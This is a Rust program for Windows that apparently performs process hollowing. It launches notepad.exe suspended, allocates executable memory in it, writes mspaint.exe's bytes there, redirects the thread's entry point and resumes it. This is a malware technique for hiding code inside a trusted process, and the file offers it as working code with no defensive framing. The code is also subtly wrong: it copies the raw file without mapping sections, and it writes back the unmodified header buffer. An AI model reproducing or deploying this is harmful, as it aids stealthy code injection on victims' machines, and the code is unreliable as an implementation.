extern crate ntapi;
extern crate winapi;

use std::{
    ffi::CString,
    io::{Error, ErrorKind, Result},
    ptr,
};
use winapi::um::{
    errhandlingapi::GetLastError,
    handleapi::CloseHandle,
    memoryapi::{ReadProcessMemory, VirtualAllocEx, WriteProcessMemory},
    processthreadsapi::{
        CreateProcessA, GetThreadContext, ResumeThread, SetThreadContext, PROCESS_INFORMATION,
        STARTUPINFOA,
    },
    winbase::CREATE_SUSPENDED,
    winnt::{
        CONTEXT, CONTEXT_FULL, HANDLE, IMAGE_DOS_HEADER, IMAGE_NT_HEADERS64, MEM_COMMIT,
        MEM_RESERVE, PAGE_EXECUTE_READWRITE,
    },
};

fn main() -> Result<()> {
    let target_path = "C:\\Windows\\System32\\notepad.exe";
    let source_path = "C:\\Windows\\System32\\mspaint.exe";

    let (h_target_process, h_target_thread) = create_suspended_process(target_path)?;
    let mut context = get_thread_context(h_target_thread)?;
    let image_base_address = context.Rdx as *mut u8;

    // Read the DOS header to find the NT headers
    let dos_header_size = std::mem::size_of::<IMAGE_DOS_HEADER>();
    let dos_header_data = read_memory(h_target_process, image_base_address, dos_header_size)?;
    let dos_header: IMAGE_DOS_HEADER =
        unsafe { std::ptr::read(dos_header_data.as_ptr() as *const _) };

    // Read the NT headers
    let nt_headers_address = unsafe { image_base_address.add(dos_header.e_lfanew as usize) };
    let nt_headers_size = std::mem::size_of::<IMAGE_NT_HEADERS64>();
    let nt_headers_data = read_memory(h_target_process, nt_headers_address, nt_headers_size)?;
    let mut nt_headers: IMAGE_NT_HEADERS64 =
        unsafe { std::ptr::read(nt_headers_data.as_ptr() as *const _) };

    // Read the source executable into memory
    let source_data = std::fs::read(source_path)?;

    // Allocate memory in the target process for the source executable
    let source_base_address = allocate_memory(h_target_process, source_data.len())?;
    write_memory(h_target_process, source_base_address, &source_data)?;

    // Update the image base address in the context
    nt_headers.OptionalHeader.ImageBase = source_base_address as u64;

    // Write the modified NT headers back to the target process
    write_memory(h_target_process, nt_headers_address, &nt_headers_data)?;

    // Set the entry point to the new address
    context.Rcx = source_base_address as u64 + nt_headers.OptionalHeader.AddressOfEntryPoint as u64;

    let success = unsafe { SetThreadContext(h_target_thread, &context) };
    if success == 0 {
        return Err(Error::new(
            ErrorKind::Other,
            format!("Failed to set thread context: {}", unsafe {
                GetLastError()
            }),
        ));
    }

    let success = unsafe { ResumeThread(h_target_thread) };
    if success + 1 == 0 {
        return Err(Error::new(
            ErrorKind::Other,
            format!("Failed to resume thread: {}", unsafe { GetLastError() }),
        ));
    }

    unsafe {
        CloseHandle(h_target_process);
        CloseHandle(h_target_thread);
    }

    Ok(())
}

fn create_suspended_process(path: &str) -> Result<(HANDLE, HANDLE)> {
    let target_process_path =
        CString::new(path).map_err(|e| Error::new(ErrorKind::InvalidInput, e.to_string()))?;
    let mut startup_info: STARTUPINFOA = unsafe { std::mem::zeroed() };
    let mut process_info: PROCESS_INFORMATION = unsafe { std::mem::zeroed() };

    println!("[+] Creating process...");
    let success = unsafe {
        CreateProcessA(
            target_process_path.as_ptr(),
            ptr::null_mut(),
            ptr::null_mut(),
            ptr::null_mut(),
            0,
            CREATE_SUSPENDED,
            ptr::null_mut(),
            ptr::null(),
            &mut startup_info,
            &mut process_info,
        )
    };
    if success == 0 {
        return Err(Error::new(
            ErrorKind::Other,
            format!("Failed to create process: {}", unsafe { GetLastError() }),
        ));
    }

    Ok((process_info.hProcess, process_info.hThread))
}

fn get_thread_context(thread: HANDLE) -> Result<CONTEXT> {
    let mut context: CONTEXT = CONTEXT {
        ContextFlags: CONTEXT_FULL,
        ..unsafe { std::mem::zeroed() }
    };

    println!("[+] Getting thread context...");
    let success = unsafe { GetThreadContext(thread, &mut context) };
    if success == 0 {
        return Err(Error::new(
            ErrorKind::Other,
            format!("Failed to get thread context: {}", unsafe {
                GetLastError()
            }),
        ));
    }

    Ok(context)
}

fn read_memory(process: HANDLE, address: *const u8, size: usize) -> Result<Vec<u8>> {
    let mut buf = vec![0u8; size];
    let mut read = 0;

    println!("[+] Reading process memory...");
    let success = unsafe {
        ReadProcessMemory(
            process,
            address as *const _,
            buf.as_mut_ptr() as *mut _,
            size,
            &mut read,
        )
    };
    if success == 0 {
        return Err(Error::new(
            ErrorKind::Other,
            format!("Failed to read process memory: {}", unsafe {
                GetLastError()
            }),
        ));
    }

    Ok(buf)
}

fn write_memory(process: HANDLE, address: *const u8, data: &[u8]) -> Result<()> {
    let mut written = 0;

    println!("[+] Writing image to process memory...");
    let success = unsafe {
        WriteProcessMemory(
            process,
            address as *mut _,
            data.as_ptr() as *const _,
            data.len(),
            &mut written,
        )
    };
    if success == 0 || written != data.len() {
        return Err(Error::new(
            ErrorKind::Other,
            format!("Failed to write memory: {}", unsafe { GetLastError() }),
        ));
    }

    Ok(())
}

fn allocate_memory(process: HANDLE, size: usize) -> Result<*mut u8> {
    println!("[+] Allocating memory...");
    let allocated_mem = unsafe {
        VirtualAllocEx(
            process,
            ptr::null_mut(),
            size,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE,
        )
    };
    if allocated_mem.is_null() {
        return Err(Error::new(
            ErrorKind::Other,
            format!("Failed to allocate memory: {}", unsafe { GetLastError() }),
        ));
    }

    Ok(allocated_mem as *mut u8)
}
